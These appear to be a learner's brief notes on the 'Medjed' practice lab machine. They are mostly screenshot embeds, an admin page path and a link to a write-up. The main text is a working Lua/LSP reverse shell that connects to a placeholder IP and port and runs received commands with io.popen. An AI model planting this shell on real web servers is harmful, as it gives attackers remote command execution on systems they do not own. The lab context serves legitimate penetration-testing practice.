Medjed
![[Pasted image 20260711062556.png]]
![[Pasted image 20260711063030.png]]
![[Pasted image 20260711063203.png]]

![[Pasted image 20260711063226.png]]

![[Pasted image 20260711063242.png]]

![[Pasted image 20260711063305.png]]


/rtl/protected/admin/customize.lsp

![[Pasted image 20260711063422.png]]

```lsp
<?lsp if request:method() == "GET" then ?>
    <?lsp 
        local host, port = "<IP>", <PORT>
        local socket = require("socket")
        local tcp = socket.tcp()
        local io = require("io")
        local connection, err = tcp:connect(host, port)
        
        if not connection then
            print("Error connecting: " .. err)
            return
        end
        
        while true do
            local cmd, status, partial = tcp:receive()
            if status == "closed" or status == "timeout" then break end
            if cmd then
                local f = io.popen(cmd, "r")
                local s = f:read("*a")
                f:close()
                tcp:send(s)
            end
        end
        
        tcp:close()
    ?>
<?lsp else ?>
    Wrong request method, goodBye! 
<?lsp end ?>
```

/about page


![[Pasted image 20260711064347.png]]
![[Pasted image 20260711064649.png]]
https://odabasi52.github.io/2026/03/19/pg-practice-medjed.html
